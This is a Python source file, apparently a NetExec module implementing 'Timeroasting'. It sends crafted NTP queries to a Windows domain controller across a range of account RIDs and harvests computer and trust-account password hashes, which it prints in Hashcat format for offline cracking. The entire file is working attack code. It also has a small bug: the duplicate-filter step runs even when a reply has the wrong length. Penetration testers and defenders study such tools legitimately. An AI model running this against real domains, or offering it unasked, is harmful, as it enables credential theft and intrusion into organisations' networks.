from binascii import hexlify, unhexlify
from select import select
from time import time
from socket import socket, AF_INET, SOCK_DGRAM
from struct import pack, unpack



def hashcat_format(rid, hashval, salt):
    """Encodes hash in Hashcat-compatible format (with username prefix)."""
    return f"{rid}:$sntp-ms${hexlify(hashval).decode()}${hexlify(salt).decode()}"

class NXCModule:
    """
    Module by Disgame: @Disgame
    Based on research from SecuraBV (@SecuraBV)

    https://github.com/SecuraBV/Timeroast/

    Much of this code was copied from the original implementation.
    """

    name = "timeroast"
    description = "Timeroasting exploits Windows NTP authentication to request password hashes of any computer or trust account"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = False

    def __init__(self):
        self.context = None
        self.module_options = None

        # Static NTP query prefix using the MD5 authenticator. Append 4-byte RID and dummy checksum to create a full query.
        self.ntp_prefix = unhexlify("db0011e9000000000001000000000000e1b8407debc7e50600000000000000000000000000000000e1b8428bffbfcd0a")
        

    def options(self, context, module_options):
        self.rids = range(1, 2**31)
        self.rate = 180
        self.timeout = 24
        self.src_port = 0
        self.old_hashes = False
        self.target = None

        if "rids" in module_options:
            self.rids = module_options["rids"]
        if "rate" in module_options:
            self.rate = module_options["rate"]
        if "timeout" in module_options:
            self.timeout = module_options["timeout"]
        if "src_port" in module_options:
            self.src_port = module_options["src_port"]
        if "old_hashes" in module_options:
            self.old_hashes = module_options["old_hashes"]

    def on_login(self, context, connection):
        if self.target is None:
            self.target = connection.host

        context.log.display("Starting Timeroasting...")
        
        for rid, md5hash, salt in self.run_ntp_roast(context, self.target, self.rids, self.rate, self.timeout, self.old_hashes, self.src_port):
            context.log.highlight(hashcat_format(rid, md5hash, salt))

    def run_ntp_roast(self, context, dc_host, rids, rate, giveup_time, old_pwd, src_port=0):
        """Gathers MD5(MD4(password) || NTP-response[:48]) hashes for a sequence of RIDs.
        Rate is the number of queries per second to send.
        Will quit when either rids ends or no response has been received in giveup_time seconds. Note that the server will 
        not respond to queries with non-existing RIDs, so it is difficult to distinguish nonexistent RIDs from network 
        issues.
        
        Yields (rid, hash, salt) pairs, where salt is the NTP response data.
        """
        # Flag in key identifier that indicates whether the old or new password should be used.
        keyflag = 2**31 if old_pwd else 0

        # Bind UDP socket.
        with socket(AF_INET, SOCK_DGRAM) as sock:
            try:
                sock.bind(("0.0.0.0", src_port))
            except PermissionError:
                context.log.exception(f"No permission to listen on port {src_port}. May need to run as root.")


            query_interval = 1 / rate
            last_ok_time = time()
            rids_received = set()
            rid_iterator = iter(rids)

            while time() < last_ok_time + giveup_time:
                # Send out query for the next RID, if any.
                query_rid = next(rid_iterator, None)
                if query_rid is not None:
                    query = self.ntp_prefix + pack("<I", query_rid ^ keyflag) + b"\x00" * 16
                    sock.sendto(query, (dc_host, 123))

                # Wait for either a response or time to send the next query.
                ready, [], [] = select([sock], [], [], query_interval)
                if ready:
                    reply = sock.recvfrom(120)[0]

                    # Extract RID, hash and "salt" if succesful.
                    if len(reply) == 68:
                        salt = reply[:48]
                        answer_rid = unpack("<I", reply[-20:-16])[0] ^ keyflag
                        md5hash = reply[-16:]

                    # Filter out duplicates.
                    if answer_rid not in rids_received:
                        rids_received.add(answer_rid)
                        yield answer_rid, md5hash, salt
                    last_ok_time = time()